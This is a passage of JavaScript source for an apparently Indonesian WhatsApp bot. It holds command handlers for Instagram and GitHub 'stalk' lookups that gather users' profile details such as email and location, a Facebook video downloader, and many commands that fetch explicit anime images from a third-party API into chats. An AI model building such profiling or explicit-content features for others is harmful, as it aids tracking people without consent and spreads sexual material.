if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return textImg('Usernamenya?')
ig.fetchUser(`${q}`).then(Y => {
let ten2 = `${Y.profile_pic_url_hd}`
let teks2 = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
${S}▢ ID : ${Y.profile_id}${S}
${S}▢ Username : ${q}${S}
${S}▢ Full Name : ${Y.full_name}${S}
${S}▢ Followers : ${Y.followers}${S}
${S}▢ Following : ${Y.following}${S}
${S}▢ PrivateAccount : ${Y.is_private}${S}
${S}▢ VerifiedAccount : ${Y.is_verified}${S}
${S}▢ Biography : ${Y.biography}${S}
${S}▢ Link : https://instagram.com/${q}${S}`
sendFileFromUrl(from, ten2, teks2) 
})      
limitAdd(sender, limit)
break    
case 'fbdl2':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (!q) return reply('Linknya?')
            if (!q.includes('facebook.com')) return reply(mess.error.Iv)
            reply(mess.wait)
            hx.fbdown(q)
            .then(G => {
            let ten = `${G.HD}`
            sendFileFromUrl(from, ten, `*Link video_normal* : ${G.Normal_video}`)
            })
            limitAdd(sender, limit)
            break    
case 'igstalk': case 'stalkig':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Kirim perintah *${prefix}igstalk* _username_`)
Flink(mess.wait)
getUser(args[1].replace('@', ''))
.then((res) => {
let { biography, fullName, subscribersCount, subscribtions, highlightCount, isBusinessAccount, isPrivate, isVerified, profilePicHD, postsCount } = res
let caption = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Fullname : ${fullName}\`\`\`
\`\`\`▢ Followers : ${subscribersCount}\`\`\`
\`\`\`▢ Following : ${subscribtions}\`\`\`
\`\`\`▢ Post Count : ${postsCount}\`\`\`
\`\`\`▢ HighlightCount : ${highlightCount}\`\`\`
\`\`\`▢ PrivateAccount : ${isPrivate ? 'Yes' : 'No'}\`\`\`
\`\`\`▢ VerifiedAccount : ${isVerified ? 'Yes' : 'No'}\`\`\`
\`\`\`▢ BusinessAccount : ${isBusinessAccount ? 'Yes' : 'No'}\`\`\`
\`\`\`▢ Biography :\`\`\` 
${biography}`
sendFileFromUrl(from, profilePicHD, caption, msg)
limitAdd(sender, limit)
})
.catch((err) => {
sendMess(Suryaa, 'IG Stalk Error : ' + err)
console.log(color('[IG Stalk]', 'red'), err)
reply(mess.error.api)
})
}
break
case 'ghstalk': case 'githubstalk': case 'ghuser':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Kirim perintah *${prefix}ghstalk* _username_`)
Flink(mess.wait)
axios.get(`https://api.github.com/users/${args[1]}`)
.then((res) => res.data)
.then((res) =>{
let { login, type, name, followers, following, created_at, updated_at, public_gists, public_repos, twitter_username, bio, hireable, email, location, blog, company, avatar_url, html_url } = res
let txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *GITHUB USER*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${login}\`\`\`
\`\`\`▢ Name : ${name}\`\`\`
\`\`\`▢ Followers : ${followers}\`\`\`
\`\`\`▢ Following : ${following}\`\`\`
\`\`\`▢ Created at :${moment(created_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\`\`\`
\`\`\`▢ Updated at : ${moment(updated_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\`\`\`
\`\`\`▢ Public Gists : ${public_gists}\`\`\`
\`\`\`▢ Public Repos : ${public_repos}\`\`\`
\`\`\`▢ Twitter : ${twitter_username}\`\`\`
\`\`\`▢ Email : ${email}\`\`\`
\`\`\`▢ Location : ${location}\`\`\`
\`\`\`▢ Blog : ${blog}\`\`\`
\`\`\`▢ Link : ${html_url}\`\`\`
\`\`\`▢ Bio :\`\`\`
${bio}`
sendFileFromUrl(from, avatar_url, txt, msg)
limitAdd(sender, limit)
})
.catch((err) => {
sendMess(Suryaa, 'GH Stalk Error : ' + err)
console.log(color('[GH Stalk]', 'red'), err)
reply(mess.error.api)
})
}
break
/*case 'waifu':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
axios.get('https://waifu.pics/api/sfw/waifu')
.then(res => res.data)
.then(res =>
sendFileFromUrl(from, res.url, 'NIH', msg)
)
.catch((err) => {
console.log(color('[Vvibu]', 'red'), err)
reply(mess.error.api)
})
limitAdd(sender, limit)
}
break*/
case 'nekonime':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
axios.get('https://waifu.pics/api/sfw/neko')
.then(res => res.data)
.then(res =>
sendFileFromUrl(from, res.url, 'NIH', msg)
)
.catch((err) => {
console.log(color('[Vvibu]', 'red'), err)
reply(mess.error.api)
})
limitAdd(sender, limit)
}
break
case 'megumin':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
axios.get('https://waifu.pics/api/sfw/megumin')
.then(res => res.data)
.then(res =>
sendFileFromUrl(from, res.url, 'NIH', msg)
)
.catch((err) => {
console.log(color('[Vvibu]', 'red'), err)
reply(mess.error.api)
})
limitAdd(sender, limit)
}
break
case 'shinobu':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
axios.get('https://waifu.pics/api/sfw/shinobu')
.then(res => res.data)
.then(res =>
sendFileFromUrl(from, res.url, 'NIH', msg)
)
.catch((err) => {
console.log(color('[Vvibu]', 'red'), err)
reply(mess.error.api)
})
limitAdd(sender, limit)
}
break

case 'kanna':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/random/kanna?apikey=${lolkey}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'nsfwcum':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let cum = await getBuffer(`https://api.lolhuman.xyz/api/random2/cum?apikey=${lolkey}`)
//surya.sendMessage(from, cum, image, msg)
let nsfwcum = await surya.prepareMessage(from, cum, image, {thumbnail: suryaImg})
const nscum = [{buttonId: 'nsfwcum', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const cumMessage = {
imageMessage: nsfwcum.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: nscum,
headerType: 4
}

surya.sendMessage(from, cumMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'nsfwero':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let ero = await getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=${lolkey}`)
//surya.sendMessage(from, ero, image, msg)
let nsfwero = await surya.prepareMessage(from, ero, image, {thumbnail: suryaImg})
const nsero = [{buttonId: 'nsfwero', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const eroMessage = {
imageMessage: nsfwero.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: nsero,
headerType: 4
}

surya.sendMessage(from, eroMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'animebooty':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let booty = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/animebooty?apikey=${lolkey}`)
//surya.sendMessage(from, booty, image, msg)
let animebooty = await surya.prepareMessage(from, booty, image, {thumbnail: suryaImg})
const nimebooty = [{buttonId: 'animebooty', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const bootyMessage = {
imageMessage: animebooty.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: nimebooty,
headerType: 4
}

surya.sendMessage(from, bootyMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'nsfwtrap':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let nsfwtrap = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/trap?apikey=${lolkey}`)
//surya.sendMessage(from, nsfwtrap, image, msg)
let trap = await surya.prepareMessage(from, nsfwtrap, image, {thumbnail: suryaImg})
const nstrap = [{buttonId: 'nsfwtrap', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const trapMessage = {
imageMessage: trap.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: nstrap,
headerType: 4
}

surya.sendMessage(from, trapMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'hentai4everyone':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let hen4 = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai4everyone?apikey=${lolkey}`)
//surya.sendMessage(from, hen4, image, msg)
let hentai4 = await surya.prepareMessage(from, hen4, image, {thumbnail: suryaImg})
const henta4 = [{buttonId: 'hentai4everyone', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const hentai4Message = {
imageMessage: hentai4.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: henta4,
headerType: 4
}

surya.sendMessage(from, hentai4Message, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'lewdanimegirls':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let lewd = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/lewdanimegirls?apikey=${lolkey}`)
//surya.sendMessage(from, lewdk, image, msg)
let lewdanime = await surya.prepareMessage(from, lewd, image, {thumbnail: suryaImg})
const animegirls = [{buttonId: 'lewdanimegirls', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const lewdMessage = {
imageMessage: lewdanime.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: animegirls,
headerType: 4
}

surya.sendMessage(from, lewdMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'animearmpits':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let animearmpits = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/ahegao?apikey=${lolkey}`)
//surya.sendMessage(from, animearmpits, image, msg)
let armpit = await surya.prepareMessage(from, animearmpits, image, {thumbnail: suryaImg})
const armpits = [{buttonId: 'animearmpits', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const pitsMessage = {
imageMessage: armpit.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: armpits,
headerType: 4
}

surya.sendMessage(from, pitsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'sideoppai':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let sideoppai = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/ahegao?apikey=${lolkey}`)
//surya.sendMessage(from, sideoppai, image, msg)
let side = await surya.prepareMessage(from, sideoppai, image, {thumbnail: suryaImg})
const oppai = [{buttonId: 'sideoppai', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const sideMessage = {
imageMessage: side.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: oppai,
headerType: 4
}
surya.sendMessage(from, sideMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'ahegao':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let ahegao = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/ahegao?apikey=${lolkey}`)
//surya.sendMessage(from, ahegao, image, msg)
let ahega = await surya.prepareMessage(from, ahegao, image, {thumbnail: suryaImg})
const aheg = [{buttonId: 'ahegao', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const ahegaoMessage = {
imageMessage: ahega.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: aheg,
headerType: 4
}

surya.sendMessage(from, ahegaoMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'hololewd':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let hololewd = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hololewd?apikey=${lolkey}`)
//surya.sendMessage(from, hololewd, image, msg)
let holole = await surya.prepareMessage(from, hololewd, image, {thumbnail: suryaImg})
const holo = [{buttonId: 'hololewd', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const holoMessage = {
imageMessage: holole.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: holo,
headerType: 4
}

surya.sendMessage(from, holoMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'ecchi':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let ecchi = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/ecchi?apikey=${lolkey}`)
//surya.sendMessage(from, ecchi, image, msg)
let ecc = await surya.prepareMessage(from, ecchi, image, {thumbnail: suryaImg})
const echi = [{buttonId: 'ecchi', buttonText: {displayText: '➡️ NEXT'}, type: 1}]
const ecchiMessage = {
imageMessage: ecc.message.imageMessage,
contentText: `Click Next Untuk Ke Gambar Selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: echi,
headerType: 4
}

surya.sendMessage(from, ecchiMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
break

case 'husbu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/random/husbu?apikey=${lolkey}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'memeindo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/meme/memeindo?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'elf':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/random/elf?apikey=${lolkey}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'art': case 'animefanart':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
sendFileFromUrl(from, `https://api.lolhuman.xyz/api/random/art?apikey=${lolkey}`, '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'sagiri':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/sagiri?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'wallnime':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/wallnime?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'shota':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/shota?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'neko':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/random/neko?apikey=${lolkey}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break
case 'hentai':
